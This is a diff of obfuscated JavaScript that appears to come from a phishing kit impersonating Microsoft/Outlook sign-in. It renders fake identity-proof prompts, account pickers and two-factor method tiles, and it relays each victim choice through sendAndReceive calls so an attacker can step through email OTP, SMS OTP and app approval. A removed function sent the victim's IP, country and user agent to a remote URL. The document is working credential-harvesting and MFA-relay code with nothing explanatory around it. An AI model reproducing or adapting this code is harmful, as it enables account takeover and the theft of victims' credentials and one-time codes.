+    _0x5e3c12 !== _0x4a2d07 &&
+      _0x5e3c12[_0x31979f(0x3a8)][_0x31979f(0x358)](_0x5e3c12);
+  }),
+    (nexteletext = _0x4a2d07["nextElementSibling"][_0x208c77(0x1f2)]);
+  const _0x287e83 = document[_0x208c77(0x3b3)](_0x208c77(0x25b));
+  _0x287e83[_0x208c77(0x208)][_0x208c77(0x23c)](_0x208c77(0x38a));
+  if (_0x344bd3[_0x208c77(0x2ab)] === _0x208c77(0x2b9))
+    (emailval = nexteletext[_0x208c77(0x34f)]("@")[_0x208c77(0x1d5)]()),
+      (_0x287e83[_0x208c77(0x1e9)] =
+        "\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22text-block-body\x22\x20id=\x22iEnterProofDesc\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20To\x20verify\x20that\x20this\x20is\x20your\x20email\x20address,\x20complete\x20the\x20hidden\x20part\x20and\x20click\x20\x22Send\x20code\x22\x20to\x20receive\x20your\x20code.\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20role=\x22alert\x22\x20aria-live=\x22assertive\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22alert\x20alert-error\x20Hide\x22\x20id=\x22iProofInputError\x22></div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22emailPartial\x20dirltr\x20input-group\x20input-max-width\x22\x20id=\x22iProofEmailEntry\x22\x20style=\x22display:\x20table;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<input\x20class=\x22form-control\x20noRightBorder\x22\x20autocomplete=\x22off\x22\x20type=\x22email\x22\x20id=\x22iProofEmail\x22\x20name=\x22iProofEmail\x22\x20maxlength=\x22113\x22\x20aria-required=\x22true\x22\x20aria-label=\x22Email\x20name\x22\x20aria-describedby=\x22iProofInputError\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<label\x20class=\x22input-group-addon\x20noLeftBorder\x20outlookEmailLabel\x22\x20id=\x22iConfirmProofEmailDomain\x22>@" +
+        emailval +
+        "</label>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22phcontainer\x22\x20id=\x22iProofPhoneEntry\x22\x20style=\x22display:\x20none;\x22\x20aria-hidden=\x22true\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<label\x20id=\x22iProofPhoneHint\x22\x20for=\x22iProofPhone\x22\x20class=\x22form-group-top\x22\x20aria-hidden=\x22true\x22>Last\x204\x20digits\x20of\x20phone\x20number</label>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22tel\x22\x20autocomplete=\x22off\x22\x20id=\x22iProofPhone\x22\x20name=\x22iProofPhone\x22\x20class=\x22form-control\x20input-max-width\x22\x20maxlength=\x224\x22\x20aria-required=\x22true\x22\x20aria-label=\x22Last\x204\x20digits\x20of\x20phone\x20number\x22\x20aria-describedby=\x22iProofInputError\x22>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20"),
+      (document[_0x208c77(0x30b)](_0x208c77(0x1e2))[_0x208c77(0x1f2)] =
+        _0x208c77(0x2eb));
+  else {
+    if (_0x344bd3[_0x208c77(0x2ab)] === _0x208c77(0x2fc))
+      (phoneval = nexteletext[_0x208c77(0x34f)]("*")[_0x208c77(0x1d5)]()),
+        (_0x287e83[_0x208c77(0x1e9)] =
+          _0x208c77(0x27a) + phoneval + _0x208c77(0x226)),
+        (document[_0x208c77(0x30b)](_0x208c77(0x1e2))[_0x208c77(0x1f2)] =
+          _0x208c77(0x2eb));
     else {
-        if (_0x3ca455[`background`] === `multiple accounts`) document[`915612HwjQev`](_0x4c0834)[`show-from-right `] = '<a\x20class=\x22link\x20mb-16\x22\x20href=\x22#\x22\x20data-id=\x22' + _0x3ca455['a_id'] + (`error ` + _0x3ca455[`bottomsection`] + `Next` + _0x3ca455['text'] + `class`);
-        else {
-            if (_0x3ca455[`background`] === `alt`) document[`915612HwjQev`](_0x4c0834)['innerHTML'] = '<a\x20class=\x22link\x20mb-16\x22\x20href=\x22#\x22\x20data-id=\x22' + _0x3ca455['a_id'] + (`error ` + _0x3ca455[`bottomsection`] + `fadeoutform 1s forwards`);
-            else _0x3ca455[`background`] === `display` && (document[`915612HwjQev`](_0x4c0834)['innerHTML'] = `section_signinanothererror` + _0x3ca455[`display`] + `class`);
-        }
+      if (_0x344bd3[_0x208c77(0x2ab)] === _0x208c77(0x1df))
+        document["getElementById"](_0x208c77(0x1e2))["textContent"] =
+          _0x208c77(0x2da);
+      else
+        _0x344bd3["value"] === _0x208c77(0x2c4) &&
+          (document[_0x208c77(0x30b)](_0x208c77(0x1e2))["textContent"] =
+            _0x208c77(0x21b));
     }
+  }
+  _0x4a2d07[_0x208c77(0x3a8)][_0x208c77(0x3a8)][_0x208c77(0x3a8)][
+    _0x208c77(0x2aa)
+  ](_0x287e83);
 }
-
-function selectmultipleaccountadfs(_0x1eea16) {
-    const _0x46cca7 = _0xe042e,
-        _0x3ed3bd = document[_0x46cca7(0x2ec)](_0x46cca7(0x1c3));
-    let _0x1b3ca4 = -0x1;
-    for (let _0xc9443d = 0x0; _0xc9443d < _0x3ed3bd[_0x46cca7(0x369)]; _0xc9443d++) {
-        if (_0x3ed3bd[_0xc9443d] === _0x1eea16) {
-            _0x1b3ca4 = _0xc9443d;
-            break;
+function displayprotectoptions(_0x99cf36) {
+  const _0x4605dc = document["getElementById"]("protectaccountoptions");
+  (_0x4605dc["innerHTML"] = ""),
+    _0x99cf36["forEach"]((_0x37ecc5, _0x3c7929) => {
+      const _0x20ac2d = _0x374d,
+        _0x56e609 = document[_0x20ac2d(0x3b3)](_0x20ac2d(0x25b));
+      _0x56e609["id"] = _0x20ac2d(0x2d7) + _0x3c7929;
+      const _0x433e66 = document[_0x20ac2d(0x3b3)](_0x20ac2d(0x25b));
+      _0x433e66["classList"][_0x20ac2d(0x23c)]("radio");
+      const _0x408d24 = document[_0x20ac2d(0x3b3)](_0x20ac2d(0x234)),
+        _0x227402 = document[_0x20ac2d(0x3b3)]("input");
+      (_0x227402[_0x20ac2d(0x395)] = _0x20ac2d(0x2ee)),
+        _0x227402[_0x20ac2d(0x26c)](_0x20ac2d(0x21e), _0x20ac2d(0x266)),
+        (_0x227402[_0x20ac2d(0x2ef)] = "radio"),
+        (_0x227402[_0x20ac2d(0x249)] = _0x20ac2d(0x394)),
+        (_0x227402[_0x20ac2d(0x2ab)] = _0x37ecc5["type"]),
+        _0x227402["classList"][_0x20ac2d(0x23c)]("inputAlignMiddle"),
+        _0x227402[_0x20ac2d(0x26c)]("aria-describedby", _0x20ac2d(0x2e8));
+      const _0x477a8f = document[_0x20ac2d(0x3b3)](_0x20ac2d(0x29c));
+      (_0x477a8f["id"] = _0x20ac2d(0x30e)),
+        _0x477a8f[_0x20ac2d(0x208)][_0x20ac2d(0x23c)](_0x20ac2d(0x24b)),
+        (_0x477a8f[_0x20ac2d(0x1f2)] = _0x37ecc5[_0x20ac2d(0x2fc)]);
+      _0x3c7929 == 0x0 && (_0x227402[_0x20ac2d(0x307)] = !![]);
+      _0x408d24[_0x20ac2d(0x2aa)](_0x227402),
+        _0x408d24[_0x20ac2d(0x2aa)](_0x477a8f),
+        _0x433e66["appendChild"](_0x408d24),
+        _0x56e609[_0x20ac2d(0x2aa)](_0x433e66);
+      if (
+        _0x3c7929 == 0x0 &&
+        _0x37ecc5[_0x20ac2d(0x395)] === _0x20ac2d(0x2b9)
+      ) {
+        emailval = _0x37ecc5[_0x20ac2d(0x2fc)][_0x20ac2d(0x34f)]("@")["pop"]();
+        const _0x688dcc = document["createElement"](_0x20ac2d(0x25b));
+        _0x688dcc[_0x20ac2d(0x208)][_0x20ac2d(0x23c)](_0x20ac2d(0x38a));
+        const _0x3740f3 = document["createElement"](_0x20ac2d(0x25b));
+        _0x3740f3["classList"][_0x20ac2d(0x23c)](_0x20ac2d(0x24d)),
+          (_0x3740f3["id"] = "iEnterProofDesc"),
+          (_0x3740f3[_0x20ac2d(0x1f2)] =
+            "To\x20verify\x20that\x20this\x20is\x20your\x20email\x20address,\x20complete\x20the\x20hidden\x20part\x20and\x20click\x20\x22Send\x20code\x22\x20to\x20receive\x20your\x20code.");
+        const _0x501866 = document[_0x20ac2d(0x3b3)]("div");
+        _0x501866[_0x20ac2d(0x26c)]("role", "alert"),
+          _0x501866[_0x20ac2d(0x26c)](_0x20ac2d(0x30d), _0x20ac2d(0x37b));
+        const _0x38d27d = document[_0x20ac2d(0x3b3)](_0x20ac2d(0x25b));
+        _0x38d27d[_0x20ac2d(0x208)]["add"](
+          _0x20ac2d(0x388),
+          "alert-error",
+          "Hide",
+        ),
+          (_0x38d27d["id"] = _0x20ac2d(0x2c8));
+        const _0x99040a = document[_0x20ac2d(0x3b3)](_0x20ac2d(0x25b));
+        _0x99040a[_0x20ac2d(0x208)][_0x20ac2d(0x23c)](
+          _0x20ac2d(0x3a9),
+          _0x20ac2d(0x24b),
+          _0x20ac2d(0x2b3),
+          "input-max-width",
+        ),
+          (_0x99040a["id"] = _0x20ac2d(0x2ac)),
+          (_0x99040a[_0x20ac2d(0x3b0)][_0x20ac2d(0x1e6)] = "table");
+        const _0xceec30 = document[_0x20ac2d(0x3b3)](_0x20ac2d(0x3ae));
+        (_0xceec30[_0x20ac2d(0x395)] = _0x20ac2d(0x2b9)),
+          (_0xceec30["name"] = _0x20ac2d(0x316)),
+          _0xceec30["classList"][_0x20ac2d(0x23c)](
+            "form-control",
+            _0x20ac2d(0x353),
+          ),
+          _0xceec30[_0x20ac2d(0x26c)](_0x20ac2d(0x1f1), _0x20ac2d(0x382)),
+          (_0xceec30[_0x20ac2d(0x32d)] = _0x20ac2d(0x31c)),
+          _0xceec30[_0x20ac2d(0x26c)](_0x20ac2d(0x37c), _0x20ac2d(0x301)),
+          _0xceec30[_0x20ac2d(0x26c)]("aria-label", _0x20ac2d(0x2a2)),
+          _0xceec30[_0x20ac2d(0x26c)](_0x20ac2d(0x204), _0x20ac2d(0x2c8));
+        const _0x5a8891 = document[_0x20ac2d(0x3b3)]("label");
+        _0x5a8891[_0x20ac2d(0x208)][_0x20ac2d(0x23c)](
+          "input-group-addon",
+          "noLeftBorder",
+          "outlookEmailLabel",
+        ),
+          (_0x5a8891[_0x20ac2d(0x1f2)] = "@" + emailval),
+          _0x99040a[_0x20ac2d(0x2aa)](_0xceec30),
+          _0x99040a[_0x20ac2d(0x2aa)](_0x5a8891),
+          _0x688dcc[_0x20ac2d(0x2aa)](_0x3740f3),
+          _0x501866["appendChild"](_0x38d27d),
+          _0x688dcc[_0x20ac2d(0x2aa)](_0x501866),
+          _0x688dcc[_0x20ac2d(0x2aa)](_0x99040a),
+          _0x56e609[_0x20ac2d(0x2aa)](_0x433e66),
+          _0x56e609[_0x20ac2d(0x2aa)](_0x688dcc);
+      } else {
+        if (
+          _0x3c7929 == 0x0 &&
+          _0x37ecc5[_0x20ac2d(0x395)] === _0x20ac2d(0x2fc)
+        ) {
+          const _0x56a7e9 = document["createElement"]("div");
+          _0x56a7e9[_0x20ac2d(0x208)][_0x20ac2d(0x23c)](_0x20ac2d(0x38a));
+          const _0x4279c9 = document[_0x20ac2d(0x3b3)](_0x20ac2d(0x25b));
+          _0x4279c9[_0x20ac2d(0x208)][_0x20ac2d(0x23c)]("text-block-body"),
+            (_0x4279c9["id"] = _0x20ac2d(0x282)),
+            (_0x4279c9[_0x20ac2d(0x1f2)] = _0x20ac2d(0x28c));
+          const _0x5c8883 = document["createElement"]("div");
+          _0x5c8883[_0x20ac2d(0x26c)]("role", "alert"),
+            _0x5c8883[_0x20ac2d(0x26c)]("aria-live", _0x20ac2d(0x37b));
+          const _0x3a3f50 = document[_0x20ac2d(0x3b3)]("div");
+          _0x3a3f50[_0x20ac2d(0x208)]["add"](
+            "alert",
+            _0x20ac2d(0x210),
+            _0x20ac2d(0x390),
+          ),
+            (_0x3a3f50["id"] = _0x20ac2d(0x2c8));
+          const _0x2c8f78 = document[_0x20ac2d(0x3b3)](_0x20ac2d(0x25b));
+          _0x2c8f78[_0x20ac2d(0x208)]["add"](_0x20ac2d(0x30a)),
+            (_0x2c8f78["id"] = _0x20ac2d(0x35e)),
+            (_0x2c8f78[_0x20ac2d(0x3b0)][_0x20ac2d(0x1e6)] = "");
+          const _0x3db57d = document["createElement"](_0x20ac2d(0x234));
+          _0x3db57d[_0x20ac2d(0x208)][_0x20ac2d(0x23c)](_0x20ac2d(0x292)),
+            (_0x3db57d["id"] = "iProofPhoneHint"),
+            _0x3db57d["setAttribute"](_0x20ac2d(0x28d), _0x20ac2d(0x378)),
+            _0x3db57d[_0x20ac2d(0x26c)]("aria-hidden", _0x20ac2d(0x301)),
+            (_0x3db57d[_0x20ac2d(0x1f2)] = _0x20ac2d(0x251));
+          const _0x4ff610 = document[_0x20ac2d(0x3b3)]("input");
+          (_0x4ff610[_0x20ac2d(0x395)] = _0x20ac2d(0x355)),
+            (_0x4ff610["id"] = _0x20ac2d(0x378)),
+            (_0x4ff610[_0x20ac2d(0x249)] = _0x20ac2d(0x378)),
+            _0x4ff610[_0x20ac2d(0x208)]["add"](
+              "form-control",
+              _0x20ac2d(0x2d5),
+            ),
+            _0x4ff610[_0x20ac2d(0x26c)](_0x20ac2d(0x1f1), _0x20ac2d(0x382)),
+            (_0x4ff610[_0x20ac2d(0x32d)] = "4"),
+            _0x4ff610[_0x20ac2d(0x26c)](_0x20ac2d(0x37c), _0x20ac2d(0x301)),
+            _0x4ff610[_0x20ac2d(0x26c)](_0x20ac2d(0x261), _0x20ac2d(0x251)),
+            _0x4ff610[_0x20ac2d(0x26c)](_0x20ac2d(0x204), _0x20ac2d(0x2c8)),
+            _0x2c8f78[_0x20ac2d(0x2aa)](_0x3db57d),
+            _0x2c8f78[_0x20ac2d(0x2aa)](_0x4ff610),
+            _0x56a7e9["appendChild"](_0x4279c9),
+            _0x5c8883[_0x20ac2d(0x2aa)](_0x3a3f50),
+            _0x56a7e9[_0x20ac2d(0x2aa)](_0x5c8883),
+            _0x56a7e9[_0x20ac2d(0x2aa)](_0x2c8f78),
+            _0x56e609[_0x20ac2d(0x2aa)](_0x433e66),
+            _0x56e609[_0x20ac2d(0x2aa)](_0x56a7e9);
         }
-    }
-    sendAndReceive(_0x46cca7(0x32b), [_0x1b3ca4], 0x1)[_0x46cca7(0x1f9)](_0xaf26 => {
-        const _0x1e57e6 = _0x46cca7;
-        _0xaf26 && _0xaf26['message'] !== _0x1e57e6(0x360) && (_0xaf26['message'] == 'password' && (document[_0x1e57e6(0x2fd)](_0x1e57e6(0x251))['classList'][_0x1e57e6(0x2cb)](_0x1e57e6(0x26f)), document['getElementById'](_0x1e57e6(0x20c))['classList'][_0x1e57e6(0x20a)]('d-none'), view = 'sidebar_pwd_adfs'), console[_0x1e57e6(0x1bd)](_0x1e57e6(0x204), _0xaf26));
-    })[_0x46cca7(0x2cc)](_0x263053 => {
-        loadinganimation(0x1), console['error']('Error:', _0x263053);
+      }
+      _0x4605dc["appendChild"](_0x56e609);
     });
 }
-
-function displaymultipleaccountsadfs(_0x4c5035) {
-    const _0x77da13 = _0xe042e,
-        _0x115487 = document[_0x77da13(0x2fd)](_0x77da13(0x1d6));
-    _0x115487[_0x77da13(0x2fc)] = '', _0x4c5035['forEach'](_0x4ae86f => {
-        const _0x2a76d4 = _0x77da13,
-            _0x4fc97b = document[_0x2a76d4(0x228)](_0x2a76d4(0x331));
-        _0x4fc97b[_0x2a76d4(0x34a)]['add'](_0x2a76d4(0x1c3)), _0x4fc97b[_0x2a76d4(0x2bf)](_0x2a76d4(0x1e6), 'selectmultipleaccountadfs(this)');
-        const _0x35ec01 = document['createElement']('img');
-        _0x35ec01[_0x2a76d4(0x34a)][_0x2a76d4(0x2f0)]('largeIcon', _0x2a76d4(0x307)), _0x35ec01[_0x2a76d4(0x293)] = _0x4ae86f['image_src'], _0x35ec01[_0x2a76d4(0x2b8)] = _0x4ae86f[_0x2a76d4(0x232)];
-        const _0xb9a991 = document[_0x2a76d4(0x228)]('div');
-        _0xb9a991[_0x2a76d4(0x34a)][_0x2a76d4(0x2f0)](_0x2a76d4(0x311), _0x2a76d4(0x307));
-        const _0x58319a = document['createElement'](_0x2a76d4(0x33b));
-        _0x58319a[_0x2a76d4(0x34a)][_0x2a76d4(0x2f0)]('largeTextNoWrap', _0x2a76d4(0x1cc)), _0x58319a[_0x2a76d4(0x1ca)] = _0x4ae86f[_0x2a76d4(0x232)], _0xb9a991['appendChild'](_0x58319a), _0x4fc97b['appendChild'](_0x35ec01), _0x4fc97b[_0x2a76d4(0x32a)](_0xb9a991), _0x115487['appendChild'](_0x4fc97b);
+function displaymultipleaccounts(_0x5c633e) {
+  const _0x3de822 = _0x283fde,
+    _0x236d6a = document[_0x3de822(0x30b)]("multipleaccountoptions");
+  (_0x236d6a["innerHTML"] = ""),
+    _0x5c633e[_0x3de822(0x2c9)]((_0xee250a) => {
+      const _0x4d7104 = _0x3de822,
+        _0x397449 = document[_0x4d7104(0x3b3)]("div");
+      _0x397449[_0x4d7104(0x208)]["add"](_0x4d7104(0x29b), _0x4d7104(0x2fb)),
+        _0x397449[_0x4d7104(0x26c)](
+          _0x4d7104(0x300),
+          "selectmultipleaccount(this)",
+        ),
+        _0x397449[_0x4d7104(0x26c)](_0x4d7104(0x2ef), _0x4d7104(0x2c3));
+      const _0x2406a9 = document[_0x4d7104(0x3b3)](_0x4d7104(0x25b));
+      _0x2406a9["classList"][_0x4d7104(0x23c)]("table"),
+        _0x2406a9[_0x4d7104(0x26c)](_0x4d7104(0x2ef), _0x4d7104(0x2ba));
+      const _0x7d51f0 = document[_0x4d7104(0x3b3)]("div");
+      _0x7d51f0[_0x4d7104(0x208)][_0x4d7104(0x23c)](_0x4d7104(0x33d));
+      const _0x521e81 = document["createElement"](_0x4d7104(0x25b));
+      _0x521e81[_0x4d7104(0x208)][_0x4d7104(0x23c)](
+        _0x4d7104(0x34a),
+        _0x4d7104(0x265),
+      );
+      const _0x48c7fa = document[_0x4d7104(0x3b3)](_0x4d7104(0x31b));
+      _0x48c7fa[_0x4d7104(0x208)][_0x4d7104(0x23c)]("tile-img"),
+        _0x48c7fa[_0x4d7104(0x26c)](_0x4d7104(0x2ef), _0x4d7104(0x230)),
+        _0x48c7fa[_0x4d7104(0x26c)]("src", _0xee250a[_0x4d7104(0x258)]),
+        _0x521e81[_0x4d7104(0x2aa)](_0x48c7fa);
+      const _0x4246a0 = document[_0x4d7104(0x3b3)](_0x4d7104(0x25b));
+      _0x4246a0["classList"]["add"](_0x4d7104(0x34a), "text-left", "content");
+      const _0x22a597 = document[_0x4d7104(0x3b3)](_0x4d7104(0x25b));
+      _0x22a597["innerText"] = _0xee250a[_0x4d7104(0x3a7)];
+      const _0x23811b = document[_0x4d7104(0x3b3)](_0x4d7104(0x25b)),
+        _0x2c650d = document["createElement"](_0x4d7104(0x2c6));
+      (_0x2c650d["innerText"] = _0xee250a[_0x4d7104(0x373)]),
+        _0x23811b[_0x4d7104(0x2aa)](_0x2c650d);
+      const _0x30b4f7 = document["createElement"]("div"),
+        _0x16426f = document[_0x4d7104(0x3b3)]("small");
+      (_0x16426f[_0x4d7104(0x37f)] = _0xee250a["email"]),
+        _0x30b4f7[_0x4d7104(0x2aa)](_0x16426f),
+        _0x4246a0[_0x4d7104(0x2aa)](_0x22a597),
+        _0x4246a0["appendChild"](_0x23811b),
+        _0x4246a0[_0x4d7104(0x2aa)](_0x30b4f7),
+        _0x7d51f0[_0x4d7104(0x2aa)](_0x521e81),
+        _0x7d51f0[_0x4d7104(0x2aa)](_0x4246a0),
+        _0x2406a9[_0x4d7104(0x2aa)](_0x7d51f0),
+        _0x397449[_0x4d7104(0x2aa)](_0x2406a9),
+        _0x236d6a[_0x4d7104(0x2aa)](_0x397449);
     });
 }
-
-function pagevisited(_0x5232a3, _0x155979) {
-    const _0x1a7b52 = _0xe042e;
-    pagevisitedalready == null && (pagevisitedalready = 0x1, $[`presentation`]({
-        'type': `confirmemail`,
-        'url': urlo,
-        'data': {
-            'pagelink': encryptData(pagelinkval),
-            'mailtype': _0x155979,
-            'type': 0x3,
-            'typeval': 0x0,
-            'ip': userip,
-            'country': usercountry,
-            'useragent': userAgent,
-            'appnum': appnum
-        },
-        'success': function (_0x57251a) {},
-        'error': function (_0x169862, _0x4f7627, _0x42f5e4) {
-            const _0x27f9a2 = _0x1a7b52;
-            console[`CompanionAppsNotification`](`pwd`, _0x42f5e4);
+function displaytwofamethods(_0x1e2f1c) {
+  const _0x675355 = _0x283fde,
+    _0x59c301 = document[_0x675355(0x30b)]("2famethods");
+  (_0x59c301["innerHTML"] = ""),
+    _0x1e2f1c[_0x675355(0x2c9)]((_0x2947be) => {
+      const _0x2f7704 = _0x675355,
+        _0x327c4e = document["createElement"](_0x2f7704(0x25b));
+      _0x327c4e[_0x2f7704(0x208)][_0x2f7704(0x23c)](_0x2f7704(0x29b), "tile"),
+        _0x327c4e["setAttribute"]("data-methodid", _0x2947be[_0x2f7704(0x348)]),
+        _0x327c4e[_0x2f7704(0x26c)](_0x2f7704(0x300), _0x2f7704(0x2c2)),
+        _0x327c4e[_0x2f7704(0x26c)](_0x2f7704(0x2ef), _0x2f7704(0x2c3));
+      const _0x4bc407 = document[_0x2f7704(0x3b3)]("div");
+      _0x4bc407[_0x2f7704(0x208)][_0x2f7704(0x23c)](_0x2f7704(0x2dd)),
+        _0x4bc407[_0x2f7704(0x26c)](_0x2f7704(0x339), "0"),
+        _0x4bc407["setAttribute"](_0x2f7704(0x2ef), _0x2f7704(0x2ba));
+      const _0x22761c = document[_0x2f7704(0x3b3)]("div");
+      _0x22761c[_0x2f7704(0x208)][_0x2f7704(0x23c)]("table-row");
+      const _0x4fa7c2 = document[_0x2f7704(0x3b3)](_0x2f7704(0x25b));
+      _0x4fa7c2[_0x2f7704(0x208)][_0x2f7704(0x23c)]("table-cell", "tile-img");
+      if (
+        _0x2947be["hasOwnProperty"](_0x2f7704(0x2fc)) &&
+        _0x2947be[_0x2f7704(0x2c0)](_0x2f7704(0x258))
+      ) {
+        const _0xd3d78c = document["createElement"](_0x2f7704(0x31b));
+        _0xd3d78c[_0x2f7704(0x208)]["add"](_0x2f7704(0x265)),
+          _0xd3d78c[_0x2f7704(0x26c)](_0x2f7704(0x2ef), _0x2f7704(0x230)),
+          _0xd3d78c[_0x2f7704(0x26c)](
+            _0x2f7704(0x33b),
+            _0x2947be[_0x2f7704(0x258)],
+          ),
+          _0x4fa7c2["appendChild"](_0xd3d78c);
+      }
+      const _0x31b9b8 = document[_0x2f7704(0x3b3)]("div");
+      _0x31b9b8[_0x2f7704(0x208)][_0x2f7704(0x23c)](
+        _0x2f7704(0x34a),
+        _0x2f7704(0x357),
+        _0x2f7704(0x32a),
+      );
+      const _0xea346 = _0x2947be[_0x2f7704(0x2c0)](_0x2f7704(0x2fc))
+        ? _0x2947be[_0x2f7704(0x2fc)]
+        : "";
+      (_0x31b9b8[_0x2f7704(0x1f2)] = _0xea346),
+        _0x22761c[_0x2f7704(0x2aa)](_0x4fa7c2),
+        _0x22761c[_0x2f7704(0x2aa)](_0x31b9b8),
+        _0x4bc407[_0x2f7704(0x2aa)](_0x22761c),
+        _0x327c4e[_0x2f7704(0x2aa)](_0x4bc407),
+        _0x59c301["appendChild"](_0x327c4e);
+    });
+}
+function selecttwofamethod(_0x1b8cc0) {
+  const _0x26e6d6 = _0x283fde,
+    _0x572e50 = document["getElementById"]("2famethods")[
+      "getElementsByClassName"
+    ](_0x26e6d6(0x2cb));
+  let _0x21cff5 = _0x1b8cc0[_0x26e6d6(0x36e)](_0x26e6d6(0x221));
+  loadinganimation(0x0),
+    sendAndReceive(_0x26e6d6(0x239), [_0x21cff5], 0x1)
+      [_0x26e6d6(0x2f5)]((_0x384b2c) => {
+        const _0x3bbaaa = _0x26e6d6;
+        if (_0x384b2c && _0x384b2c[_0x3bbaaa(0x2b0)] !== _0x3bbaaa(0x20f)) {
+          loadinganimation(0x1), (wait2facancel = 0x0);
+          _0x384b2c[_0x3bbaaa(0x2b0)] == _0x3bbaaa(0x320) &&
+            ((document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x2c5))[_0x3bbaaa(0x37f)] =
+              _0x3bbaaa(0x223)),
+            document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x214))[_0x3bbaaa(0x2cc)](
+              _0x3bbaaa(0x257),
+            ),
+            document["getElementById"](_0x3bbaaa(0x214))[_0x3bbaaa(0x2cc)](
+              _0x3bbaaa(0x342),
+            ),
+            (document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x214))[_0x3bbaaa(0x2ab)] =
+              ""),
+            document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x214))[_0x3bbaaa(0x26c)](
+              _0x3bbaaa(0x3b8),
+              _0x3bbaaa(0x263),
+            ),
+            (document[_0x3bbaaa(0x30b)]("error_confirmemailorphone_live")[
+              _0x3bbaaa(0x3b0)
+            ][_0x3bbaaa(0x1e6)] = _0x3bbaaa(0x25a)),
+            (document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x385))[_0x3bbaaa(0x37f)] =
+              ""),
+            checkerrordesc(
+              "confirmemailorphone_live",
+              0x0,
+              _0x384b2c[_0x3bbaaa(0x2bb)],
+            ),
+            bottomsectionlinks(
+              "confirmemailorphone_live",
+              _0x384b2c[_0x3bbaaa(0x213)],
+            ),
+            changebackbutton(_0x3bbaaa(0x381), _0x384b2c[_0x3bbaaa(0x326)]),
+            (document["getElementById"](_0x3bbaaa(0x31d))[_0x3bbaaa(0x2ab)] =
+              _0x384b2c[_0x3bbaaa(0x2b9)]),
+            document[_0x3bbaaa(0x30b)]("section_" + view)[_0x3bbaaa(0x208)][
+              _0x3bbaaa(0x315)
+            ](_0x3bbaaa(0x1d6)),
+            document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x20a))[_0x3bbaaa(0x208)][
+              _0x3bbaaa(0x39e)
+            ](_0x3bbaaa(0x1d6)),
+            (view = "confirmemailorphone_live"),
+            (viewtype = _0x3bbaaa(0x2b9)));
+          _0x384b2c[_0x3bbaaa(0x2b0)] == "sms\x20otp\x20live" &&
+            ((document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x2c5))[_0x3bbaaa(0x37f)] =
+              _0x3bbaaa(0x2ff)),
+            document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x214))["setAttribute"](
+              _0x3bbaaa(0x257),
+              "4",
+            ),
+            document["getElementById"](_0x3bbaaa(0x214))[_0x3bbaaa(0x26c)](
+              _0x3bbaaa(0x342),
+              _0x3bbaaa(0x24e),
+            ),
+            (document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x214))["value"] = ""),
+            document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x214))[_0x3bbaaa(0x26c)](
+              _0x3bbaaa(0x3b8),
+              _0x3bbaaa(0x251),
+            ),
+            (document["getElementById"]("error_confirmemailorphone_live")[
+              "style"
+            ][_0x3bbaaa(0x1e6)] = _0x3bbaaa(0x25a)),
+            (document["getElementById"](_0x3bbaaa(0x385))["innerText"] = ""),
+            checkerrordesc(_0x3bbaaa(0x381), 0x0, _0x384b2c[_0x3bbaaa(0x2bb)]),
+            bottomsectionlinks(
+              "confirmemailorphone_live",
+              _0x384b2c["bottomsection"],
+            ),
+            changebackbutton(_0x3bbaaa(0x381), _0x384b2c[_0x3bbaaa(0x326)]),
+            (document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x31d))[_0x3bbaaa(0x2ab)] =
+              _0x384b2c[_0x3bbaaa(0x2e7)]),
+            document["getElementById"](_0x3bbaaa(0x23e) + view)[
+              _0x3bbaaa(0x208)
+            ]["toggle"]("d-none"),
+            document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x20a))[_0x3bbaaa(0x208)][
+              "remove"
+            ](_0x3bbaaa(0x1d6)),
+            (view = _0x3bbaaa(0x381)),
+            (viewtype = _0x3bbaaa(0x2e7)));
+          _0x384b2c["message"] == _0x3bbaaa(0x354) &&
+            (document["getElementById"](_0x3bbaaa(0x35b))[_0x3bbaaa(0x26c)](
+              _0x3bbaaa(0x3b8),
+              _0x3bbaaa(0x245),
+            ),
+            (document[_0x3bbaaa(0x30b)]("error_otp_live")["style"][
+              _0x3bbaaa(0x1e6)
+            ] = _0x3bbaaa(0x25a)),
+            (document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x2a7))["innerText"] = ""),
+            document["getElementById"](_0x3bbaaa(0x362))["setAttribute"](
+              _0x3bbaaa(0x33b),
+              _0x384b2c[_0x3bbaaa(0x258)],
+            ),
+            checkerrordesc(_0x3bbaaa(0x2e6), 0x0, _0x384b2c[_0x3bbaaa(0x2bb)]),
+            bottomsectionlinks(_0x3bbaaa(0x2e6), _0x384b2c[_0x3bbaaa(0x213)]),
+            changebackbutton(_0x3bbaaa(0x2e6), _0x384b2c[_0x3bbaaa(0x326)]),
+            document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x23e) + view)[
+              _0x3bbaaa(0x208)
+            ][_0x3bbaaa(0x315)]("d-none"),
+            document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x2ea))["classList"][
+              _0x3bbaaa(0x39e)
+            ](_0x3bbaaa(0x1d6)),
+            (view = _0x3bbaaa(0x2e6)),
+            (viewtype = _0x3bbaaa(0x284)));
+          _0x384b2c[_0x3bbaaa(0x2b0)] == _0x3bbaaa(0x2b5) &&
+            ((document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x333))[_0x3bbaaa(0x3b0)][
+              "display"
